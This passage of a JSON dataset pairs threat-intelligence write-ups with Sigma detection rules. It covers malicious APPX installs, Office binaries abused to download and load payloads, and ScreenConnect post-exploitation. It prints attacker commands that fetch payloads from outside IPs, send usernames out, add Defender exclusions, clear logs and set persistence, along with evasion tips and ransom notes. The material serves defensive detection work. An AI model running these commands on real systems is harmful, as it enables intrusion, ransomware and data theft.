 00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Potential Malicious AppX Package Installation Attempts",
      "id": "09d3b48b-be17-47f5-bf4e-94e7e75d09ce",
      "status": "test",
      "description": "Detects potential installation or installation attempts of known malicious appx packages",
      "references": [
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
        "https://forensicitguy.github.io/analyzing-magnitude-magniber-appx/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-01-12",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": [
            400,
            401
          ],
          "PackageFullName|contains": "3669e262-ec02-4e9d-bcb4-3d008b4afac9"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Rare occasions where a malicious package uses the exact same name and version as a legtimate application"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_mal_appx_names.yml"
  },
  "24": {
    "url": "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191",
    "markdown": "# Unsanitized file validation leads to Malicious payload download via Office binaries.\n\nUpdate 23-Sep-2019 — Added to Lolbas|Lolbin contribution.\n\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/\n\nAs a part of finding vulnerable endpoints to improve defence, I used to reckon legitimate binaries on any chance of masking for payload download/execute.\n\nI focused my research towards Office binaries (winword/powerpnt/excel), My aim is to download a payload remotely via legitimate binaries by application whitelisting and execute via Office binaries.\n\nI came to know that we can able to open a remote document as Read-Only, I focused on that feature.\n\n## 1. Payload Download — No proper validation on remote files.\n\nI tried to download a remote file and it opens as Read-Only, but I wonder is there any cache stored locally?\n\n> winword.exe “http://192.168.1.10/test.docx”\n\nI fired up Procmon this time and look for artefacts and found the cache was stored on below 2 locations temporarily.\n\n> %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.MSO\n> %localappdata%\\\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\[random folder]\n> %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\\n\nThis time I tried to download an executable and Winword.exe opens with scrambled strings.\n\n> winword.exe “http://192.168.1.10/shell.exe”\n\nI noticed the file was downloaded here %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.MSO and deletes itself once the document closed, This is enough for an attacker to get the payload.\n\nI probed further and found the raw payload was stored in %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\[random folder]\\ as .EXE even after the document closed, Amazing!.\n\nUsing this method, an attacker will **mask the payload download** to evade defence mechanism especially **Application whitelisting**.\n\n## 2. Execute the payload in ‘Office’ way — used for defence evasion.\n\nI focused my research on how to execute payload with the help of Office binaries.\n\nThis time I downloaded a DLL.\n\n> winword.exe “http://192.168.1.10/TeamsAddinLoader.dll”\n\nOnce the DLL was downloaded, I probed possible ways to execute the DLL via Office binaries. As researched, there is a feature we can load Addins to Microsoft office.\n\nI load the DLL payload via Microsoft Office, Awesome again I got the remote shell. When I see the chain of events, **Winword.exe -> Rundll32 -> C2**, there is no initial visibility on command line that which file rundll32 loaded (Of course we can get those details by looking into memory).\n\n```image\nDescription: The image displays the properties window of the 'rundll32.exe' process on a Windows system. It shows the associated 'Image File' details, including the path to 'rundll32.exe', the command line being executed, and other process information. The left side of the image highlights 'winword.exe' and 'rundll32.exe', indicating a relationship between these processes, which is relevant to the discussed payload execution method. This context is important for understanding how Office binaries can be exploited to execute malicious DLLs.\nTranscription: |\n  rundll32.exe:4732 Properties\n  \n  Image File\n      Windows host process (Rundll32)\n      Microsoft Corporation\n      Version: 6.1.7600.16385\n      Build Time: Tue Jul 14 05:11:43 2009\n  \n  Path:\n      C:\\Windows\\SysWOW64\\rundll32.exe\n  \n  Command line:\n      rundll32.exe\n  \n  Current directory:\n      C:\\Users\\Jones\\Desktop\\\n  \n  Autostart Location:\n      n/a\n  \n  Processes:\n      vmtoolsd.exe\n      procexp64.exe\n      Procmon.exe\n      ProcessIdleRun.exe\n      rundll32.exe\n      ModelListener.exe\n```\n\n> Steps:\n> winword.exe -> file -> options -> Add-ins -> manage COM addins -> click GO -> add the dll.\n\nThe above 2 features indeed not a vulnerability, but the attackers can use windows legitimate binaries to download and execute the payload. This has been tracking as LOLBINS.\n\nhttps://youtu.be/yk3gKrgRVEE\n\nAs you can see above all payload download and execute are carried on via Office binaries.\n\nBut we can recommend Microsoft on first method “Payload Download” to stop downloading/opening when the file was not in supported format.\n\n### Recommendation to Blue/Red Team:\n\n**Blue Team:**\n\n- Always look for non-microsoft domain connections from Office binaries.\n- Investigate the executables which are written by Office binaries.\n- Respect your instinct on suspicious events.\n\n**Red Team:**\n\n- Download the file with document extensions.\n- Base64 the executable and download with document extensions.\n- Do the same as XOR’d.\n- Insert the base64 payload to original document.\n- Split the inserted payload to original document.\n- Password protect the Base64 embedded document.",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml"
  },
  "25": {
    "url": "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
    "markdown": "# SlashAndGrab: ScreenConnect Post-Exploitation in the Wild (CVE-2024-1709 & CVE-2024-1708)\n\n**February 23, 2024**\n\n---\n\n## Table of Contents:\n\n- Adversaries Deploying Ransomware\n- Adversaries Enumerating\n- Adversary Cryptocurrency Miners\n- Adversaries Installing Additional Remote Access\n- Downloading Tools and Payloads\n- Adversaries Dropping Cobalt Strike\n- Adversaries Persisting\n- Wrapping Up\n- Appendix\n\n---\n\nSince February 19, Huntress has been sharing technical details of the ScreenConnect vulnerability we’re calling “SlashAndGrab.” In previous posts, we shared the details of this vulnerability, its exploit, and shared detection guidance.\n\nIn this article, we’ve collected and curated threat actor activity fresh from the Huntress Security Operations Center (SOC), where our team has detected and kicked out active adversaries leveraging ScreenConnect access for post-exploitation tradecraft.\n\nThe adversaries taking advantage of this vulnerability have been VERY busy. There is a lot to cover here, so buckle up and enjoy some tradecraft!\n\n---\n\n## Adversaries Deploying Ransomware\n\nA number of adversaries leveraged their newly ill-gotten ScreenConnect gains to deploy ransomware.\n\n### LockBit\n\nWith the impressive joint international takedown efforts to disrupt the LockBit ransomware group, many are asking how “LockBit” is still relevant. The LockBit deployments that we’ve seen are invoked with an encryptor that looks to be compiled around September 13, 2022—which is the same timeline as the leaked LockBit 3.0 builder in the past. One observed filename is classic **LB3.exe**, which again, matches the canned and publicly leaked builder.\n\nWe believe this is an important distinction. While the malware deployed appears associated with LockBit, there is no evidence we’ve seen suggesting the joint international takedown efforts are anything short of a landmark milestone to disrupt one of the largest and most active ransomware groups in the world.\n\n```\n# Ransomware binaries\nC:\\Windows\\TEMP\\ScreenConnect\\22.5.7881.8171\\LB3.exe\\\n\n# Defense evasion\npowershell -c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}\n```\n\n```image\nAlt: Example of LockBit ransomware executed through ScreenConnect\nDescription: The image displays a detection timeline related to a cyber threat incident. It highlights a sequence of monitored processes, specifically focusing on 'ScreenConnect.ClientService.exe' and 'LB3.exe', which is flagged as critical. The timeline illustrates the parent-child relationship between processes and includes detailed process information such as Process ID (PID), user, and command line executed. The context indicates that this is part of an analysis related to LockBit ransomware, showing the progression and monitoring of potentially malicious processes.\nTranscription: |\n  Detection Timeline\n  - wininit.exe (1 of 4) [Monitored]\n  - services.exe (2 of 4) [Monitored]\n  - ScreenConnect.ClientService.exe (3 of 4) [Monitored]\n  - LB3.exe (4 of 4) [Critical]\n  \n  Process Details\n  - Parent PID: 4080\n  - PID: 7680\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: LB3.exe\n  - Detection Rule: Lockbit Process Name\n  - Started At: 2024-02-22 11:12:34 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\Windows\\TEMP\\ScreenConnect\\22.5.7881.8171\\LB3.exe\n  - Command Line: \"C:\\\\Windows\\\\TEMP\\\\ScreenConnect\\\\22.5.7881.8171\\\\LB3.exe\"\n  - MITRE\n```\n\n*Figure 1: Example of LockBit ransomware executed through ScreenConnect*\n\nWe’ve included the resulting ransom note associated with the above executable.\n\n```image\nAlt: Ransomware note\nDescription: The image contains a ransom note associated with LockBit ransomware. It presents a text-based message detailing threats regarding stolen and encrypted data, instructions for contacting the attackers, and a warning against modifying files. The note emphasizes the attackers' intent to extort money and mentions the use of a specific chat application for communication. Key elements include instructions, guarantees from the attackers, and a personal decryption ID.\nTranscription: |\n  >>>> Your data are stolen and encrypted\n  \n  The data will be published on TOR website if you do not pay the ransom\n  \n  >>>> What guarantees that we will not deceive you?\n  \n  We are not a politically motivated group and we do not need anything other than your money.\n  \n  If you pay, we will provide you the programs for decryption and we will delete your data.\n  \n  If we do not give you decryptors, or we do not delete your data after payment, then nobody will pay us in the future.\n  Therefore to us our reputation is very important. We attack the companies worldwide and there is no dissatisfied victim after payment.\n  \n  >>>> You need contact us and decrypt one file for free on these TOR sites with your personal DECRYPTION ID\n  \n  Download and install tox chat https://tox.chat/download.html\n  Write to a chat and wait for the answer, we will always answer you.\n  Sometimes you will need to wait for our answer because we attack many companies.\n  Our tox id is ______________________\n  \n  >>>> Your personal DECRYPTION ID: ______________________\n  \n  >>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!\n  \n  >>>> Warning! If you do not pay the ransom we will attack your company repeatedly again!\n```\n\n*Figure 2: Ransomware note*\n\n### Other Ransomware Attempts\n\nWe observed other ransomware attempts, like **upd.exe** and **svchost.exe**, that Microsoft Defender consistently neutralized.\n\nWe also observed adversaries leverage certutil downloaded ransomware **.MSI** payloads, which they also made persistent via startup folders.\n\n```\ncertutil -urlcache -f http[:]//23.26.137[.]225:8084/msappdata.msi c:\\mpyutd.msi\n```\n\n```image\nAlt: Example of ransomware added as a persistence mechanism\nDescription: The image depicts a detailed table showcasing information related to a ransomware persistence mechanism identified as 'mpyutild.msi.' It includes various fields such as Host Autorun ID, File Path, Name, User, Command, Classification Date, and Binary Modification and Creation Times. The highlighted sections emphasize the file path and name, indicating its location in the 'Common Startup Folder' on a Windows system. This data serves to illustrate how the ransomware attempts to maintain persistence on a victim's machine.\nTranscription: |\n  | Detector              | Type                    | Name         | Date Added              | Present | Category |\n  | --------------------- | ----------------------- | ------------ | ----------------------- | ------- | -------- |\n  | Common Startup Folder |                         | mpyutild.msi | 2024-02-22 05:14:27 UTC | ✅       |          |\n  | Host Autorun ID       | 23740849496             |              |                         |         |          |\n  | Created               | 1 day                   |              |                         |         |          |\n  | Classification        | Monitored               |              |                         |         |          |\n  | Classification Source | Unknown                 |              |                         |         |          |\n  | Classification Date   | 2024-02-22 05:13:42 UTC |              |                         |         |          |\n  | From Survey           | 02/22/2024 - 05:14      |              |                         |         |          |\n  \n  **Foothold Details**\n  | File Path                                                                 | Name         | Path                                                                      | User   | Command      |\n  | ------------------------------------------------------------------------- | ------------ | ------------------------------------------------------------------------- | ------ | ------------ |\n  | c:\\programdata\\microsoft\\windows\\start menu\\programs\\startup\\mpyutild.msi | mpyutild.msi | c:\\programdata\\microsoft\\windows\\start menu\\programs\\startup\\mpyutild.msi | Public | mpyutild.msi |\n  \n  | Location       | Binary Mod Time         | Binary Create Time      |\n  | -------------- | ----------------------- | ----------------------- |\n  | Common Startup | 2024-02-22 00:04:04 EST | 2024-02-22 00:04:39 EST |\n```\n\n*Figure 3: Example of ransomware added as a persistence mechanism*\n\nThe ransom note from the threat actor who deployed the MSI has been included as well.\n\n```image\nAlt: Example ransomware note\nDescription: The image displays a ransom note from a threat actor, formatted in a text document. It outlines allegations of network intrusion and file encryption, claiming that all files on the victim's servers are encrypted. The note provides instructions for contacting the attacker, including an email address and a Tox chat app link, and emphasizes urgency with a 72-hour payment deadline. It also mentions a price increase for the decryption software and includes threats regarding stolen data.\nTranscription: |\n  Hello\n  \n  We are a team of high-level competent team of Pentesters but NOT a THREAT to your reputable organization\n  We secure networks of companies to avoid complete destruction and damages to companies\n  We encrypted all files on Your servers to show sign of breach / network intrusion\n  \n  To resolve this Continue reading !!!!\n  ALL files on Your Entire Network Servers and Connected Devices are Encrypted.\n  Means , Files are modified and are not usable at the moment.\n  \n  Don't Panic !!!\n  All Encrypted files can be reversed to original form and become usable .\n  This is Only Possible if you buy the universal Decryption software from me.\n  \n  Price for universal Decryption Software : $ Contact us either through email or tox chat app for the ransom price $\n  You Have 72 hours To Make Payment As Price of Universal Decryption software increases by $1000 dollars every 24 hours.\n  Contact on this email:\n  copy email address and write message to __________\n  You can write me on tox:\n  Download tox app from https://tox.chat\n  Create new Account ..\n  Send me friend request using my tox id: __________\n  \n  *copy and paste it as is*\n  \n  Before You Pay me ... I will Decrypt 3 files for free To proof the universal Decryption software works\n  Failure to Pay Me :\n  \n  Kindly RESPECT my Rules\n  Note: Huge amounts of Data / documents has been stolen from your Network servers and will be published online for free\n  I have stolen All Your Databases ; Data on your shared drives ; AD users Emails(Good for Spam) ;\n  i have stolen huge amount of critical data from your servers\n  * I keep the breach private only if your cooperate *\n```\n\n*Figure 4: Example ransomware note*\n\n### Ransomware Anti-Forensics\n\nRansomware actors also tried to remove event logs via **wevtutil.exe cl** to frustrate investigators' analysis at a later time. Fortunately, Huntress Managed EDR is far too perceptive to entertain adversarial frustration. 😉\n\n```image\nAlt: Example execution of wevtutil.exe log clearing via ScreenConnect\nDescription: The image presents a detailed detection timeline associated with the execution of the command line tools 'cmd.exe' and 'wevtutil.exe.' It shows process details, including the parent process ID, user information, command line arguments, and various hashes (SHA1, SHA256, MD5) for both executables. The highlighted sections emphasize the command lines executed, pointing out the use of 'ScreenConnect' for remote access and the execution of 'wevtutil.exe' for clearing Windows event logs, which is relevant to ransomware anti-forensics efforts.\nTranscription: |\n  Detection Timeline\n  \n  Process Details\n  ---------------\n  Parent PID: 4440\n  PID: 11872\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: cmd.exe\n  Started At: 2024-02-22 19:36:39 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\WINDOWS\\System32\\cmd.exe\n  Command Line: \\\"cmd.exe\\\" /C \\\"C:\\WINDOWS\\System32\\cmd.exe /c 10013.8329\\dd419f4e-1c21-4cbf-975c-4941d566284f\\run.cmd\\\"\n  \n  File Details\n  ------------\n  Signature: Microsoft Corporation\n  SHA1: e9be2f86e33abf0d1953aeccf0ed22284596d4\n  SHA256: 265b69033eca7e978214a34cd9b17912909af46c747395d7bb893a24507e59\n  MD5: cb6cd09f6a257448fae64b3e4d620c5\n  Size: 283 KB\n  \n  Process Details\n  ---------------\n  Parent PID: 11872\n  PID: 17928\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: wevtutil.exe\n  Detection Rule: Windows Event Log Clearing\n  Started At: 2024-02-22 19:36:57 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\WINDOWS\\system32\\wevtutil.exe\n  Command Line: wevtutil.exe cl \\\"Application\\\"\n```\n\n*Figure 5: Example execution of wevtutil.exe log clearing via ScreenConnect*\n\n---\n\n## Adversaries Enumerating\n\nThere was a particular adversary, using **185.62.58[.]132**, executing a script on compromised systems across multiple unique victim networks. The intent of the script was to identify which of their compromised systems with the highest privileges.\n\nWe believe this demonstrates the scale with which threat actors are abusing this vulnerability as they are working to automate their understanding of where to take additional, post-compromise actions moving forward.\n\n```\npowershell.exe  Invoke-WebRequest -Uri http[:]//108.61.210.72/MyUserName_$env:UserName\n```\n\n```image\nAlt: Adversary enumerating the user they control via ScreenConnect\nDescription: The image depicts a detailed log table showcasing various PowerShell command executions on compromised systems. It highlights the use of the 'Invoke-WebRequest' command with a specific URI, indicating attempts to enumerate user credentials via the ScreenConnect application. Key columns include the process name, command line executed, user names, and parent process details, providing insight into the actions of an adversary on victim networks.\nTranscription: |\n  | process.name   | process.command_line                                                 | process.user.name | process.parent.name | process.parent.command_line.text                                                                       |\n  | -------------- | -------------------------------------------------------------------- | ----------------- | ------------------- | ------------------------------------------------------------------------------------------------------ |\n  | powershell.exe | Invoke-WebRequest -Uri http://188.61.210.72/MyUserName_$env:UserName | SYSTEM            | cmd.exe             | cmd.exe /C \"C:\\Windows\\TEMP\\ScreenConnect\\2.8.29679.7539\\fe61ca1f-3905-4264-bc7e-7aa926f96f36run.cmd\"  |\n  | powershell.exe | Invoke-WebRequest -Uri http://188.61.210.72/MyUserName_$env:UserName | SYSTEM            | cmd.exe             | cmd.exe /C \"C:\\Windows\\TEMP\\ScreenConnect\\2.8.29679.7539\\358e425f-ac72-4de6-a4e9-b9eb34427run.cmd\"     |\n  | powershell.exe | Invoke-WebRequest -Uri http://188.61.210.72/MyUserName_$env:UserName | SYSTEM            | cmd.exe             | cmd.exe /C \"C:\\Windows\\TEMP\\ScreenConnect\\2.8.29679.7539\\e79b94be-ed74-471c-af77-5e320756e44frun.cmd\"  |\n  | powershell.exe | Invoke-WebRequest -Uri http://188.61.210.72/MyUserName_$env:UserName | SYSTEM            | cmd.exe             | cmd.exe /C \"C:\\Windows\\TEMP\\ScreenConnect\\2.8.29679.7539\\251f1d95c-16c9-424b-8217-a39ef95ad864run.cmd\" |\n```\n\n*Figure 6: Adversary enumerating the user they control via ScreenConnect*\n\n```image\nAlt: Figure 7:  Adversary enumerating the user they control via ScreenConnect \nDescription: The image displays a detection timeline related to a security incident, highlighting various monitored processes and their details. It includes the 'ScreenConnect.ClientService.exe' process marked as monitored, along with 'cmd.exe' and 'services.exe'. The timeline shows intervals of activity for each process, with a specific focus on a high-priority event involving 'powershell.exe'. This event features process details such as Parent PID, PID, user information, command line executed, and the executable path, showcasing a command line that uses 'Invoke-WebRequest' to gather user credentials from a specified URI.\nTranscription: |\n  plaintext\n  Detection Timeline\n  \n  Monitored services.exe (2 of 4) Interval: Unknown #1520\n  \n  Monitored ScreenConnect.ClientService.exe (3 of 4) Interval: 5h 31m 25s #6952\n  \n  Monitored cmd.exe (4 of 4) Interval: 19h 13m 58s #4796\n  \n  High powershell.exe (5 of 4) Interval: 0s #4328\n  \n  Process Details\n  Parent PID          4796\n  PID                 4328\n  User                NT AUTHORITY\\SYSTEM\n  User ID             S-1-5-18\n  Process Name        powershell.exe\n  Detection Rule      ThreatOps Hunting\n  Started At          2024-02-22 12:54:15 UTC\n  Elevated Access Privileges  False\n  Executable          C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Command Line        powershell.exe Invoke-WebRequest -Uri http://108.61.210.72/MyUserName_$env:UserName\n```\n\n---\n\n## Adversary Cryptocurrency Miners\n\nSomewhat disappointing for a lack of originality, a significant number of adversaries used their ScreenConnect access to deploy cryptocurrency coin miners.\n\nThere was a particularly entertaining attempt to masquerade a coinminer as a legitimate SentinelOne file.\n\n```\npowershell  wget -uri http://185[.]232[.]92[.]32:8888/SentinelUI.exe -OutFile C:\\\\Windows\\\\Help\\\\Help\\\\SentinelUI.exe;\n\nwget -uri http://185[.]232[.]92[.]32:8888/Logs.txt -OutFile C:\\\\Windows\\\\Help\\\\Help\\\\Logs.txt;\n\nwget -uri http://185[.]232[.]92[.]32:8888/SentinelAgentCore.dll -OutFile C:\\\\Windows\\\\Help\\\\Help\\\\SentinelAgentCore.dll;\n\ncmd /c C:\\\\Windows\\\\Help\\\\Help\\\\SentinelUI.exe;\n\nSCHTASKS /Create /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\UserCache_1708535250863 /TR \\\"C:\\\\Windows\\\\Help\\\\Help\\\\SentinelUI.exe\\\" /RU SYSTEM /SC ONSTART /RL HIGHEST /NP /F /DELAY 0000:05\n```\n\n```image\nAlt: Creation of a coinminer masquerading as SentinelOne\nDescription: The image depicts a detection timeline from a cybersecurity monitoring tool, illustrating the processes that were observed during an incident involving the deployment of a coinminer. Key elements include a list of monitored processes such as 'ScreenConnect.ClientService.exe', 'powershell.exe', and 'cmd.exe'. The timeline highlights the 'powershell.exe' process as having elevated access privileges and shows the command line used for executing a PowerShell script that downloaded a file masquerading as a legitimate SentinelOne executable. This provides detailed insights into the methods and tools used by adversaries in the context of cryptocurrency mining.\nTranscription: |\n  Detection Timeline\n  -------------------\n  - wininit.exe (1 of 5)\n 